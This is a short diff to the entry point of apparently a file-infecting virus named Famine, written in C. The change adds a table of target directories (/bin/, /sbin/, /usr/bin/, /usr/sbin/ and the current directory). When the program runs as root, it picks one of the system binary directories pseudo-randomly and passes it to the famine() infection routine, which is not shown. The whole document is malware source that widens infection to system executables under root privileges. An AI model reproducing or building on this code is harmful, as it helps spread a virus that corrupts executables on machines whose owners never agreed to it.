@@ -1,21 +1,39 @@
 #include <famine.h>
 
 ////////////////////////////////////////////////////////////////////////////////
+/// STATIC FUNCTION
+////////////////////////////////////////////////////////////////////////////////
+
+static inline unsigned int get_random_index(void)
+{
+	const unsigned long seed = 0;
+	const unsigned int ret = ((long)(&seed) >> 8) % 4;
+
+	return ret;
+}
+
+////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
+struct directory infect[] =
+{
+	(struct directory){"/bin/", "", 5},
+	(struct directory){"/sbin/","", 6},
+	(struct directory){"/usr/bin/", "", 9},
+	(struct directory){"/usr/sbin/", "", 10},
+	(struct directory){"./", "", 2},
+};
+
+
 void entry(void)
 {
-	char *bin[] = {"/bin", "/usr/bin", "/sbin", "usr/sbin"};
-	char cwd[] = ".";
-	char *dir;
+	unsigned int index = 4;
 
 	if (getuid() == 0)
-		dir = bin[1];
-	else
-		dir = cwd; 
-
-	famine(dir);
+		index = get_random_index();
+	
+	famine(&infect[index]);
 }
 
 ////////////////////////////////////////////////////////////////////////////////
